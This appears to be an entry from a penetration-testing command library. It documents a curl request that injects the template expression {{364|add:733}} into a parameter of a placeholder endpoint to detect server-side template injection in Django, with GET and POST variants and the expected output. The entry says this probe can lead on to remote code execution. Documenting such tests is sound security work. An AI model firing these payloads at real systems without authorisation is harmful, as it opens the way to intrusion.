---
id: 08ee2981-9edd-4cc1-b3e6-353ec08ae8b2
type: command
executor: bash
data: >-
  curl -X GET
  "http://target.example.com/vulnerable?input=ih0vr{{364|add:733}}d121r" -H
  "User-Agent: Mozilla/5.0"
output: null
created_at: '2023-04-06T03:56:39.377186+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Web
tags:
  - ssti
  - payload-injection
verified: true
validated: true
---

# ssti-django-burp-payload-injection

## Command

```bash
curl -X GET "http://target.example.com/vulnerable?input=ih0vr{{364|add:733}}d121r" -H "User-Agent: Mozilla/5.0"
```

## Description

This command injects a Burp-calculated payload to test Django template filters like |add:. The expression {{364|add:733}} evaluates to 1097, confirming filter support and potential for more complex chains leading to RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target.example.com/vulnerable` | Vulnerable endpoint URL | Yes |
| `input` | Injection parameter | Yes |
| `ih0vr{{364|add:733}}d121r` | Payload with embedded calculation (becomes ih0vr1097d121r) | Yes |
| `-H "User-Agent: Mozilla/5.0"` | Browser-like header | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.example.com/vulnerable?input=ih0vr{{364|add:733}}d121r"
```

### Advanced Usage

For POST: ```bash
curl -X POST "http://target.example.com/vulnerable" -d "input=ih0vr{{364|add:733}}d121r"
```

## Expected Output

Successful evaluation shows 'ih0vr1097d121r' in the response, indicating filter execution:

```
Processed input: ih0vr1097d121r
```

Literal output suggests no SSTI.

## Related

- [[procedures/Exploit-SSTI-in-Django-Templates-using-Burp-Payloads]]
- [[commands/ssti-django-simple-math-test]]
